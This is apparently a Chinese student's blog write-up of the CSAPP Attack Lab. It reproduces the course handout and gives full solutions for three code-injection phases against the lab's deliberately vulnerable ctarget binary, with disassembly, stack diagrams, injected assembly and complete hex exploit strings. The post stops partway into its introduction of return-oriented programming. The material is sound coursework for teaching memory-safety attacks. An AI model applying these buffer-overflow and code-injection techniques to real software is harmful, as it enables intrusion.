---
title: "CSAPP｜Attack Lab"
description: "CSAPP第三次实验任务，转守为攻🗡️"
publishDate: 2023-12-09
coverImage:
  src: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTAtaE97y5UzxCFBHOAZ4fuhjBAe7-0dJi6CrZCY-oSOg&s=10"
  alt: "CSAPP"
tags: ["course"]
---


> 系WHU2021级《系统级程序设计》实验3，节选于CSAPP Lab。[CMU实验指导原文PDF](http://csapp.cs.cmu.edu/3e/attacklab.pdf)
> 

## 引言

### 1 实验步骤

#### 1.1 第一步：获取文件

在远程桌面中用浏览器访问网页：[http://172.16.2.207:15513](http://172.16.2.207:15513/)或者双击桌面上的Attack Lab Download Page快捷方式，输入你的学号和email地址，得到targetXXXX.tar文件。解压targetXXXX.tar文件（`tar -xvf targetXXXX.tar`）得到一个目录./targetXXXX，其中包含如下文件：

- README.txt：描述本目录内容的文件。
- ctarget：一个容易遭受code-injection攻击的可执行程序。
- rtarget：一个容易遭受return-oriented-programming攻击的可执行程序。
- cookie.txt：一个8位的十六进制码，是你的唯一标识符，用于验证身份。
- farm.c：你的目标“gadget farm”的源代码，在产生return-oriented programming攻击时会用到。
- hex2raw：一个生成攻击字符串的工具。

#### 1.2 要点说明

要在我们提供的实验平台上完成该实验，我们不保证在其他平台上作出的结果能在我们的验证平台上成功执行。

你的解答不能绕开程序中的验证代码。也就是说，ret指令使用的攻击字符串中注入的地址必须是一下几种之一：

- 函数touch1，touch2或touch3的地址
- 你注入的代码的地址
- gadget farm中gadget的地址

只能从文件rtarget中地址范围在函数start_farm和end_farm之间的地址构造gadget。

#### 1.3 提交成绩

以[http://172.16.2.207:15513/scoreboard.html](http://172.16.2.207:15513/scoreboard.html)记录为准。

**~~由于不同班要求不同，不用点击“提交评测”，以scoreboard分数为准~~**

~~务必在所有实验内容完成之后（三关共五阶段），点击“提交评测”提交成绩到希冀平台！否则系统无法记录分数。~~

---

### 2 目标程序

CTARGET和RTARGET都是用`getbuf`函数从标准输入读入字符串，getbuf函数定义如下：

```c
unsigned getbuf(){
	char buf[BUFFER_SIZE]; 
	Gets(buf); 
	return 1; 
}
```

函数`Gets`类似于标准库函数gets，从标准输入读入一个字符串（以`\n`或者end-of-file结束），将字符串（带null结束符）存储在指定的目的地址。

从这段代码可以看出，目标地址是数组buf，声明为BUFFER_SIZE个字节。BUFFER_SIZE是一个编译时常量，在你的target程序生成时就具体确定了。

函数`Gets()`和`gets()`都无法确定目标缓冲区是否够大，能够存储下读入的字符串。它们都只会简单地拷贝字节序列，可能会超出目标地址处分配的存储空间的边界。

如果用户输入和getbuf读入的字符串足够短，getbuf会返回1，如下执行示例所示：

![](https://cslabcg.whu.edu.cn/userfiles/image/2021/1637043900761086141.png)

如果你输入的字符串很长，就会出错：

![](https://cslabcg.whu.edu.cn/userfiles/image/2021/1637043909025059866.png)

（注意cookie的值会每个人有所不同。）

RTARGET程序有类似的行为。正如错误消息提示的那样，超出缓冲区大小通常会导致程序状态被破坏，引起内存访问错误。你的任务是巧妙的设计输入给CTARGET和RTARGET的字符串，让它们做些更有趣的事情。这样的字符串称为*攻击（exploit）*字符串。

CTARGET和RTARGET有这样一些命令行参数：

- `-h`：输出可能的命令行参数列表
- `-q`：不向打分服务器发送结果
- `-i FILE`：输入来自于文件FILE而不是标准输入

一般来说，你的攻击字符串包含的字节值并不都对应着能够打印出来的字符的ASCII值，因此建议使用文件输入，在文件中直接写字节值。

HEX2RAW程序的使用见附录A。

**⚠️要点说明：**

- 你的攻击字符串不能包含字节值0x0a，这是换行符（’\n’）的ASCII代码。Gets遇到这个字节时会认为你意在结束该字符串。
- HEX2RAW要求输入的十六进制值必须是两位的，值与值之间以一个或多个空白分隔。如果你想得到一个十六进制值为0的字节，必须输入00。要得到字0xdeadbeef，必须向HEX2RAW输入“ef be ad de”（注意顺序相反是因为使用的是小端法字节序）。

本实验分为五个阶段，CTARGET的三个使用的是CI（code-injection），RTARGET的两个阶段使用的是ROP（return-oriented-programming），如图1所示。

| 阶段 | 程序 | 关数 | 方法 | 函数 | 分数 |
| --- | --- | --- | --- | --- | --- |
| 1 | CTARGET | 1 | CI | touch1 | 10 |
| 2 | CTARGET | 2 | CI | touch2 | 20 |
| 3 | CTARGET | 3 | CI | touch3 | 20 |
| 4 | RTARGET | 2 | ROP | touch2 | 35 |
| 5 | RTARGET | 3 | ROP | touch3 | 15 |

图1. attack lab阶段小结

---

### 3. 实验内容第一部分：代码注入攻击

**前**三个阶段，你的攻击字符串会攻击CTARGET程序。程序被设置成栈的位置每次执行都一样，这样一来栈上的数据就可以等效于可执行代码。这使得程序更容易遭受包含可执行代码字节编码的攻击字符串的攻击。

#### 3.1 第一关

在这一关中，你不用注入新的代码，你的攻击字符串要指引程序去执行一个已经存在的函数。

**CTARGET**中函数`test`调用了函数`getbuf`，`test`的代码如下：

```c
void test(){
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

getbuf执行返回语句时（getbuf的第5行），按照规则，程序会继续执行test函数中的语句，而我们想改变这个行为。

在文件ctarget中，函数touch1的代码如下：

```c
void touch1(){
	vlevel = 1;    /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

你的任务是让**CTARGET**在getbuf执行返回语句后执行touch1的代码。注意，你的攻击字符串可以破坏栈中不直接和本阶段相关的部分，这不会造成问题，因为touch1会使得程序直接退出。

⚠️**要点说明：**

- 设计本阶段的攻击字符串所需的信息都从检查**CTARGET**的反汇编代码中获得。用`objdump -d`进行反汇编。
- 主要思路是找到touch1的起始地址的字节表示的位置，使得getbuf结尾处的ret指令会将控制转移到touch1。
- 注意字节顺序。
- 可能需要用GDB单步跟踪调试getbuf的最后几条指令，确保它按照你期望的方式工作。
- buf在getbuf栈帧中的位置取决于编译时常数BUFFER_SIZE的值，以及GCC使用的分配策略。你需要检查反汇编带来来确定它的位置。

#### 3.2 第二关

第二关中，你需要在攻击字符串中注入少量代码。

在ctarget文件中，函数touch2的代码如下：

```c
void touch2(unsigned val){
	vlevel = 2;  /* part of validation protocol */
	if(val == cookie){
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	}else{
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fall(2);
	}
	exit(0);
}
```

你的任务是使**CTARGET**执行touch2的代码而不是返回到test。在这个例子中，你必须让touch2以为它收到的参数是你的cookie。

💡**建议：**

- 需要确定你注入代码的地址的字节表示的位置，使getbuf代码最后的ret指令会将控制转移到那里。
- 注意，函数的第一个参数是放在寄存器%rdi中的。
- 你注入的代码必须将寄存器的值设定为你的cookie，然后利用ret指令将控制转移到touch2的第一条指令。
- 不要在攻击代码中使用jmp或call指令。所有的控制转移都要使用ret指令，即使实际上你并不是要从一个函数调用返回。
- 参见附录B学习如何生成指令序列的字节级表示。

#### 3.3 第三关

第三阶段还是代码注入攻击，但是是要传递字符串作为参数。

ctarget文件中函数hexmatch和touch3的C代码如下：

```c
int hexmatch(unsigned val, char *sval){
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval){
	vlevel = 3;       /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	}else{
		printf("Misfire: You called touch3(\"%s\")\n", sval);
	 fail(3);
	}
	exit(0);
}
```

你的任务是让**CTARGET**执行touch3而不要返回到test。要使touch3以为你传递你的cookie的字符串表示作为它的参数。

💡**建议：**

- 你的攻击字符串中要包含你的cookie的字符串表示。这个字符串由8个十六进制数字组成（顺序是从最高位到最低位），开头没有“0x”。
- 注意，C中的字符串表示是一个字节序列，最后跟一个值为0的字节。“man ascii”能够找到你需要的字符的字节表示。
- 你的注入代码应该将寄存器%rdi设置为攻击字符串的地址。
- 调用hexmatch和strncmp函数时，会将数据压入栈中，覆盖getbuf使用的缓冲区的内存，你需要很小心把你的cookie字符串表示放在哪里。

---

### **4. 实验内容第二部分：面向返回的编程**

对程序RTARGET进行代码注入攻击要难一些，它采用了以下两种技术对抗攻击：

- 采用了随机化，每次运行栈的位置都不同。所以无法决定你的注入代码应该放在哪里。
- 将保存栈的内存区域设置为不可执行，所以即使你能把注入的代码的起始地址放到程序计数器中，程序也会报段错误失败。

幸运的是，聪明的人们设计了一些策略，通过执行现有程序中的代码来做他们期望的事情，而不是注入新的代码。这种方法称为**面向返回的编程（ROP）**。

例如，rtarget可能包含如下代码：

```c
void setval_210(unsigned *p){
	*p = 3347663060U;
}
```

这个函数不太可能会攻击到一个系统，但是这段代码反汇编出来的机器代码是：

```asm
0000000000400f15 <setval_210>:
400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)
400f1b:       c3                      retq
```

字节序列48 49 c7是指令movq %rax, %rdi的编码。图2A展示了一些有用的movq指令的编码。你的RTARGET的攻击代码由一组类似于setval_210的函数组成，我们称为gadget farm。你的工作是从gadget farm中挑选出有用的gadget执行类似于前述第二关和第三关的攻击。

⚠️**要点说明：**

- 函数start_farm和end_farm之间的所有函数构成了你的gadget farm。不要用程序代码中的其他部分作为你的gadget。

#### 4.1 第二关

在第四阶段，你将重复第二阶段的攻击，不过要使用gadget farm里的gadget来攻击RTARGET程序。你的答案只使用如下指令类型的gadget，也只能使用前八个x86-64寄存器（%rax-%rdi）。

- movq：代码如图2A所示。
- popq；代码如图2B所示。
- ret：该指令编码为0xc3。
- nop：该指令编码为0x90。

💡**建议：**

- 只能用两个gadget来实现该次攻击。
- 如果一个gadget使用了popq指令，那么它会从栈中弹出数据。这样一来，你的攻击代码能既包含gadget的地址也包含数据。

![](https://cslabcg.whu.edu.cn/userfiles/image/2021/1637043923939021644.png)

图2. 指令的字节编码。所有的值均为十六进制。

#### 4.2 第三关

阶段五要求你对RTARGET程序进行ROP攻击，用指向你的cookie字符串的指针，使程序调用touch3函数。

这一关，允许你使用函数start_farm和end_farm之间的所有gadget。除了第四阶段允许的那些指令，还允许使用movl指令（如图2C所示），以及图2D中的2字节指令，它们可以作为有功能的nop，不改变任何寄存器或内存的值，例如，andb %al, %al，这些指令对寄存器的低位字节做操作，但是不改变它们的值。

💡**提示：**

- 官方答案需要8个gadgets。

---

### **附录A HEX2RAW的使用**

HEX2RAW的输入是一个十六进制格式的字符串，用两个十六进制数字表示一个字节值。例如，字符串“012345”，必须输入“30 31 32 33 34 35 00”。十六进制字符之间以空白符（空格或新行）分隔。

可以把攻击字符串存入文件中，例如exploit.txt，以下列几种方式调用：

1.  
    
    ```bash
    unix> *cat exploit.txt | ./hex2raw | ./ctarget*
    ```
    
2. 
    
    ```bash
    unix> *./hex2raw < exploit.txt > exploit-raw.txt*  ## 将exploit.txt内容作为输入提供给./hex2raw，执行的结果重定向输出到exploit-raw.txt
    **unix> *./ctarget < exploit-raw.txt*  ## 将exploit-raw.txt的内容作为输入提供给./ctarget
    ```
    
    这种方法也可以结合gdb使用：
    
    ```bash
    unix> gdb ctarget
    (gdb) run < exploit-raw.txt
    ```
    
3. 
    
    ```bash
    unix> *./hex2raw < exploit.txt > exploit-raw.txt*
    unix> ./ctarget -i exploit-raw.txt  ## 将exploit-raw.txt中内容作为输入，调用./ctarget
    ```
    
    这种方法也可以和gdb一起使用。
    

### **附录B 生成字节代码**

假设编写一个汇编文件example.s，代码如下：

```asm
; Example of hand-generated assembly code
pushq   $0xabcdef             ; Push value onto stack
addq    $17,%rax              ; Add 17 to %rax
movl    %eax,%edx             ; Copy lower 32 bits to %edx
```

可以汇编和反汇编文件：

```bash
unix> gcc -c example.s

unix> objdump -d example.o > example.d
```

生成的example.d包含如下内容：

```asm
example.o: file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
0: 68 ef cd ab 00                         pushq  $0xabcdef
5: 48 83 c0 11                add    $0x11,%rax
9: 89 c2                                   mov    %eax,%edx
```

由此可以推出这段代码的字节序列：

68 ef cd ab 00 48 83 c0 11 89 c2

可以通过HEX2RAW生成目标程序的输入字符串。也可以手动修改example.d的代码，得到下面的内容：

```
68 ef cd ab 00   /* pushq  $0xabcdef  */
48 83 c0 11     /* add    $0x11,%rax */
89 c2          /* mov    %eax,%edx  */
```

这也是合法的HEX2RAW的输入。

---

## 概述

> 基本上跟着Instruction一步步走就好
> 

在解题之前，先将**CTARGET**和**RTARGET**进行反汇编——执行`objdump -d target > target_disas`命令。

:::note
通过测试发现，输入的字符串会转化为对应的ASCII码，从栈顶开始一个个存进去。
但并不是所有的字节值都对应着*能够打印出来的字符*的ASCII值，因此使用**文件输入**——在文件`exploit.txt`中直接写字节值，通过**HEX2RAW**生成作为**CTARGET**输入的`exploit-raw.txt`：

```bash
## 将exploit.txt内容作为输入提供给./hex2raw，执行的结果重定向输出到exploit-raw.txt
unix> *./hex2raw < exploit.txt > exploit-raw.txt*  
## gdb调试
unix> gdb ctarget
(gdb) run < exploit-raw.txt
*## 直接运行*
unix> *./ctarget < exploit-raw.txt*  ## 将exploit-raw.txt的内容作为输入提供给./ctarget
```

在获取汇编指令对应的字节值时，执行以下命令：

```asm
unix> gcc -c exploit_command.s
unix> objdump -d exploit_command.o > exploit_command.d
```

之后打开`exploit_command.d`文件即可，注意获得的字节值应**直接**放入`exploit.txt`，不需要调转顺序

:::

---

## Part I : **Code Injection Attacks**

在第一部分，攻击字符串会攻击**CTARGET**程序，而程序的每次执行栈都在同一个位置，于是栈上的数据可等效于可执行代码。这使得程序更容易遭受包含可执行代码字节编码的攻击字符串的攻击。

:::note
基本操作：在调用函数`Gets`时打断点，观察读取前后的栈结构变化

:::

### Phase1  Level 1

#### 任务

**CTARGET**中函数`test`调用了函数`getbuf`，在`getbuf`返回之后，原本会继续执行函数`test`剩下的打印语句，但我们需要让其转而执行函数`touch1`。

相关的代码如下：

```c
void test(){
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}

unsigned getbuf(){
	char buf[BUFFER_SIZE]; 
	Gets(buf); 
	return 1; 
}

void touch1(){
	vlevel = 1;    /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

#### 思路

找到`touch1`的起始地址的字节表示的位置，使得`getbuf`结尾处的`ret`指令将控制转移到`touch1`。

具体而言，由于函数`Gets`不会检查输入长度，我们有机会通过“输入溢出”来改写栈中意外的地方，而在这里“意外的地方”就是`getbuf`函数返回时的跳转地址，而究竟怎么写需要根据`buf[BUFFER_SIZE]`的地址（这是函数`Get`接收输入并写入的地方）。

查看CTARGET的反汇编文件，可以找到这三个函数的汇编代码：

- `getbuf`
    
    ```asm
    0000000000401762 <getbuf>:
      401762:	48 83 ec 38          	sub    $0x38,%rsp  
      401766:	48 89 e7             	mov    %rsp,%rdi     ; 分配0x38字节栈空间，作为参数调用Gets函数，可知BUFFER_SIZE=0x38=56
      401769:	e8 2c 02 00 00       	callq  40199a <Gets>
      40176e:	b8 01 00 00 00       	mov    $0x1,%eax
      401773:	48 83 c4 38          	add    $0x38,%rsp
      401777:	c3                   	retq
    
    ```
    
- `touch1`
    
    ```asm
    0000000000401778 <touch1>:
      401778:	48 83 ec 08          	sub    $0x8,%rsp
      40177c:	c7 05 76 2d 20 00 01 	movl   $0x1,0x202d76(%rip)        ## 6044fc <vlevel>
      401783:	00 00 00 
      401786:	bf a1 2e 40 00       	mov    $0x402ea1,%edi
      40178b:	e8 c0 f4 ff ff       	callq  400c50 <puts@plt>
      401790:	bf 01 00 00 00       	mov    $0x1,%edi
      401795:	e8 ef 03 00 00       	callq  401b89 <validate>
      40179a:	bf 00 00 00 00       	mov    $0x0,%edi
      40179f:	e8 3c f6 ff ff       	callq  400de0 <exit@plt>
    ```
    
- `test`
    
    ```asm
    
    00000000004018dc <test>:
      4018dc:	48 83 ec 08          	sub    $0x8,%rsp
      4018e0:	b8 00 00 00 00       	mov    $0x0,%eax
      4018e5:	e8 78 fe ff ff       	callq  401762 <getbuf>
      4018ea:	89 c6                	mov    %eax,%esi       ; 调用getbuf后的返回地址
      4018ec:	bf 68 2f 40 00       	mov    $0x402f68,%edi
      4018f1:	b8 00 00 00 00       	mov    $0x0,%eax
      4018f6:	e8 85 f3 ff ff       	callq  400c80 <printf@plt>
      4018fb:	48 83 c4 08          	add    $0x8,%rsp
      4018ff:	c3                   	retq
    ```
    

可知，`touch1`函数的起始地址为`0x401778`，而调用`Gets`前分配的栈空间大小为56个字节。

接下来，通过gdb查看调用`Gets`前的栈空间：

![截屏2023-12-10 16.06.05.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_16.06.05.png)

其中`0x4018ea`是`test`中`getbuf`的返回地址，也是我们希望更改的地方。

> 在这里，我定位返回地址的方法是——从前往后数7*8个字节，发现最后8个字节在`0x55654938`处，那么`0x55654940`的8个字节必然是返回地址，其值为`0x4018ea`；
> 

#### 栈结构

`getbuf`函数执行`ret`返回后的栈结构如下：

![Untitled.png](CSAPP%EF%BD%9CAttack%20Lab/Untitled.png)

其中蓝色底的格子为函数`getbuf`的**返回地址**。

:::tip
返回地址应该存在**调用者**`test()`栈桢的顶层

:::

#### 解决

因此，攻击字符串的结果为：

```text
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11
11 11 11 11 11 11 11 11 
78 17 40
```

查看调用`Gets`后的栈空间

![截屏2023-12-10 16.48.05.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_16.48.05.png)

> 这里我们的攻击字符串破坏了栈中不直接和本阶段相关的部分，即`0x5558600`，但并不会造成问题，因为`touch1`会使得程序直接退出。
> 

执行后任务完成。

![截屏2023-12-10 20.12.57.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_20.12.57.png)

---

### Phase 2 Level 2

#### 任务

与**Level 1**类似，我们需要让程序执行`touch2`而不是返回`test`；

但这次我们需要在攻击字符串中加入少许代码，使得调用`touch2`时参数为我的**cookie**（ungisned类型）。

- `touch2`（C语言）
    
    ```c
    void touch2(unsigned val){
    	vlevel = 2;  /* part of validation protocol */
    	if(val == cookie){
    		printf("Touch2!: You called touch2(0x%.8x)\n", val);
    		validate(2);
    	}else{
    		printf("Misfire: You called touch2(0x%.8x)\n", val);
    		fall(2);
    	}
    	exit(0);
    }
    ```
    
- `touch2`（反汇编）
    
    ```asm
    00000000004017a4 <touch2>:
      4017a4:	48 83 ec 08          	sub    $0x8,%rsp
      4017a8:	89 fe                	mov    %edi,%esi
      4017aa:	c7 05 48 3d 20 00 02 	movl   $0x2,0x203d48(%rip)        ## 6054fc <vlevel>
      4017b1:	00 00 00 
      4017b4:	3b 3d 4a 3d 20 00    	cmp    0x203d4a(%rip),%edi        ## 605504 <cookie>
      4017ba:	75 1b                	jne    4017d7 <touch2+0x33>
      4017bc:	bf f8 2f 40 00       	mov    $0x402ff8,%edi
      4017c1:	b8 00 00 00 00       	mov    $0x0,%eax
      4017c6:	e8 b5 f4 ff ff       	callq  400c80 <printf@plt>
      4017cb:	bf 02 00 00 00       	mov    $0x2,%edi
      4017d0:	e8 e4 04 00 00       	callq  401cb9 <validate>
      4017d5:	eb 19                	jmp    4017f0 <touch2+0x4c>
      4017d7:	bf 20 30 40 00       	mov    $0x403020,%edi
      4017dc:	b8 00 00 00 00       	mov    $0x0,%eax
      4017e1:	e8 9a f4 ff ff       	callq  400c80 <printf@plt>
      4017e6:	bf 02 00 00 00       	mov    $0x2,%edi
      4017eb:	e8 7b 05 00 00       	callq  401d6b <fail>
      4017f0:	bf 00 00 00 00       	mov    $0x0,%edi
      4017f5:	e8 e6 f5 ff ff       	callq  400de0 <exit@plt>
    ```
    

#### 思路

根据level1中查看的栈情况，我们可以在`buf`数组（即栈中的空白区）写入攻击代码，再通过“输入溢出“，修改函数跳转后的地址为攻击代码的首地址。

其中，攻击代码也需要一次`ret`跳转，于是需要在攻击代码中压栈`touch2`的首地址。

已知函数第一个参数存放在寄存器`%rdi`，而题目要求任何跳转都只能使用`ret`指令。

查看**CTARGET**文件，可知`touch2`的首地址为`0x4017a4`

于是编写攻击代码如下：

```asm
movq $0x2ded9dc0,%rdi   ; 设置参数为cookie的值
pushq $0x4017a4        ; 将touch2首地址压栈，待ret跳转时使用
ret
```


💡 注意，指令`ret` <=> `pop %rip`，跳转的指令地址是需要从栈中弹出来的，需要在进行`ret`前刚好处在栈顶，在这里需要进行`pushq`操作，而不能简单地在追加到攻击字符串的后面。

- 错误的攻击代码和字符串：
    
    ```asm
    mov $0x2ded9dc0,%rdi  ; 设置参数为cookie的值
    ret
    ```
    
    ```
    48 c7 c7 c0 9d ed 2d  // 将参数寄存器%rdi设置为cookie的值
    c3                    // ret返回
    a4 17 40              // touch2的首地址
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00
    00 00 00 00 00 00 00 00  // 必须为0，否则会干扰上下文
    00 00 00 00 00 00 00 00
    00 00 00 00 00  
    08 49 65 55           // 修改为攻击代码的首地址，注意应当往高处挤
    ```
    

#### 栈结构

`getbuf`函数执行`ret`返回后的栈结构如下：

![Untitled.png](CSAPP%EF%BD%9CAttack%20Lab/Untitled%201.png)

注意，`&(touch2)`是执行攻击代码后压栈的，之后`rsp`将下移8bytes。

具体而言，`getbuf`函数返回后将跳转`0x55654908`执行攻击代码，将`&(touch2)`压栈；之后执行`ret`命令，栈弹出`&(touch2)`，跳转执行函数`touch2`。

:::tip
需要注意，如果地址中包含有字节值`0x0a`，函数`Gets`读取到后会识别为换行符，导致后面的字符串全都丢失；
为了解决这个问题，我们需要将其转化为两个步骤——先赋值`0x9`，再通过指令`inc`加一得到`0xa`，如：

```asm
mov $0x54e16afd,%rdi
mov $0x401809,%rdx
inc %rdx  ; 0x40180a
pushq %rdx
ret
```

:::

#### 解决

将攻击代码写入文件`two.s`，之后执行以下命令：

```asm
unix> gcc -c two.s
unix> objdump -d two.o > two.d
```

可以得到攻击代码的字节值：

![截屏2023-12-10 20.01.06.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_20.01.06.png)

于是攻击字符串为：

```
48 c7 c7 c0 9d ed 2d  // 将参数寄存器%rdi设置为cookie的值
68 a4 17 40 00        // 将touch2的首地址压栈
c3                    // ret返回
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 
08 49 65 55           // 攻击代码的首地址，注意应当往高处挤，即之前必须填充满56个字节
```

查看调用`Gets`前后的栈结构对比如下：

![截屏2023-12-10 16.06.05.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_16.06.05.png)

![截屏2023-12-10 20.08.55.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_20.08.55.png)

紧跟着往下执行，可以看到程序成功跳转到了攻击代码的首地址，且成功更改寄存器`%rdi`的值

![截屏2023-12-10 20.10.36.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_20.10.36.png)

继续执行，任务完成。

![截屏2023-12-10 20.11.06.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_20.11.06.png)

---

### Phase 3 Level 3

#### 任务

同样是代码注入攻击，要让程序执行`touch3`而不是返回到`test`，且执行`touch3`时传入的参数须为我的**cookie**（char*字符串类型）。

- `hexmatch`（C语言）
    
    ```c
    int hexmatch(unsigned val, char *sval){
    	char cbuf[110];
    	/* Make position of check string unpredictable */
    	char *s = cbuf + random() % 100;     // s的地址是随机的
    	sprintf(s, "%.8x", val);
    	return strncmp(sval, s, 9) == 0;
    }
    ```
    
- `touch3`（C语言）
    
    ```c
    void touch3(char *sval){
    	vlevel = 3;       /* Part of validation protocol */
    	if (hexmatch(cookie, sval)) {
    		printf("Touch3!: You called touch3(\"%s\")\n", sval);
    		validate(3);
    	}else{
    		printf("Misfire: You called touch3(\"%s\")\n", sval);
    	 fail(3);
    	}
    	exit(0);
    }
    ```
    
- `touch3`（反汇编）
    
    ```asm
    0000000000401878 <touch3>:
      401878:	53                   	push   %rbx
      401879:	48 89 fb             	mov    %rdi,%rbx
      40187c:	c7 05 76 3c 20 00 03 	movl   $0x3,0x203c76(%rip)        ## 6054fc <vlevel>
      401883:	00 00 00 
      401886:	48 89 fe             	mov    %rdi,%rsi
      401889:	8b 3d 75 3c 20 00    	mov    0x203c75(%rip),%edi        ## 605504 <cookie>
      40188f:	e8 66 ff ff ff       	callq  4017fa <hexmatch>
      401894:	85 c0                	test   %eax,%eax
      401896:	74 1e                	je     4018b6 <touch3+0x3e>
      401898:	48 89 de             	mov    %rbx,%rsi
      40189b:	bf 48 30 40 00       	mov    $0x403048,%edi
      4018a0:	b8 00 00 00 00       	mov    $0x0,%eax
      4018a5:	e8 d6 f3 ff ff       	callq  400c80 <printf@plt>
      4018aa:	bf 03 00 00 00       	mov    $0x3,%edi
      4018af:	e8 05 04 00 00       	callq  401cb9 <validate>
      4018b4:	eb 1c                	jmp    4018d2 <touch3+0x5a>
      4018b6:	48 89 de             	mov    %rbx,%rsi
      4018b9:	bf 70 30 40 00       	mov    $0x403070,%edi
      4018be:	b8 00 00 00 00       	mov    $0x0,%eax
      4018c3:	e8 b8 f3 ff ff       	callq  400c80 <printf@plt>
      4018c8:	bf 03 00 00 00       	mov    $0x3,%edi
      4018cd:	e8 99 04 00 00       	callq  401d6b <fail>
      4018d2:	bf 00 00 00 00       	mov    $0x0,%edi
      4018d7:	e8 04 f5 ff ff       	callq  400de0 <exit@plt>
    ```
    

#### 思路

思路依旧是通过函数`Gets`向（`getbuf`的）栈中写入攻击代码，但由于参数需要是char*类型，我们还需要考虑字符串形式的**cookie**存在哪里。

重新捋一下函数调用关系——

1. `test`调用 `getbuf` ；
2. 执行时，`getbuf`栈桢被修改，执行一段攻击代码，之后返回到`touch3`的首地址，回收栈桢；
3. `touch3`调用`hexmatch`。

因此栈中总共的栈桢变化为：`test`+`getbuf`（修改）→ `test`+`hexmatch`

在`hexmatch`栈桢中，局部变量s的地址是随机的，而且还调用了函数`strncmp`，将**cookie**存在原先的`getbuf`栈桢中会有被覆盖的风险；故考虑将**cookie**存入父函数`test`的栈桢中。

让我们先看看`test`的栈桢，将断点打在调用`getbuf`之前，可知此时栈指针为`0x55654948`、指向了一段可用的8字节空间，刚好能够用来存**cookie**。

![截屏2023-12-10 22.13.46.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_22.13.46.png)

可知`touch3`的首地址为`0x401878`，于是攻击代码如下：

```asm
movq $0x55654948,%rdi  ; 设置参数为cookie字符串的首地址
pushq $0x401878        ; 压栈touch3的首地址
ret                    ; 返回，跳转touch3
```

又可知**cookie**（`0x2ded9dc0`）的ASCII码字节值为：`32 64 65 64 39 64 63 30`

#### 栈结构

`getbuf`函数执行`ret`返回后的栈结构如下：

![Untitled.png](CSAPP%EF%BD%9CAttack%20Lab/Untitled%202.png)

注意，`&(touch3)`是执行攻击代码后才压栈的，压栈后`rsp`将下移8字节。

具体而言，`getbuf`函数执行`ret`后弹出返回地址`0x55654908`（攻击代码的首地址）并跳转执行攻击代码，在执行`pushq`时将`touch3`的首地址压栈，最后执行`ret`将其弹出，跳转执行函数`touch3`。

#### 解决

查看攻击代码的字节值：

![截屏2023-12-10 22.49.41.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_22.49.41.png)

于是可构建攻击字符串：

```
48 c7 c7 48 49 65 55     // 将参数rdi设置为cookie字符串的首地址
68 78 18 40 00           // 将touch3地址压栈
c3                       // 返回，调用touch3函数 13
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00
08 49 65 55 00 00 00 00  // 攻击代码的首地址
32 64 65 64 39 64 63 30  // cookie的ASCII码字节值（小端）
00                       // 字符串末尾要跟上一个`\0`字符
```

运行，任务完成。

![截屏2023-12-10 23.02.41.png](CSAPP%EF%BD%9CAttack%20Lab/%25E6%2588%25AA%25E5%25B1%258F2023-12-10_23.02.41.png)

---

## Part II : **Return-Oriented Programming**

第二部分将攻击程序**RTARGET**，但对其代码注入要难一些，它采用了以下两种技术对抗攻击：

- 栈随机化，每次运行栈的位置都不同，因而无法决定你的攻击代码代码应该注入哪里。
- 将保存栈的内存区域设置为不可执行，所以即使你能把注入的代码的起始地址放到程序计数器中，程序也会报段错误失败。

幸运的是，聪明的人们设计了一些策略，通过执行现有程序中的代码来做他们期望的事情，而不是注入新的代码。这种方法称为**面向返回的编程（ROP）**。

> *The strategy with ROP is to identify byte sequences within an existing program that consist of one or more instructions followed by the instruction ret.* 
在已有的程序中找到特定的以`ret`结尾的指令序列，称这样的代码段为**gadget**；
把要用到部分的地址压入栈中，每次`ret`后又会取出一个新的gadget，进而形成一个程序链。
> 

![Untitled](CSAPP%EF%BD%9CAttack%20Lab/Untitled%203.png)

举例而言，rtarget可能包含下面这个函数：

```asm
0000000000400f15 <setval_210>:
400f15:       c7 07 d4 48 89 c7       movl   $0xc78948d4,(%rdi)
400f1b:       c3                      retq
```

这个函数本无害，但其末尾的字节序列`48 49 c7`是指令`movq %rax, %rdi`的编码。

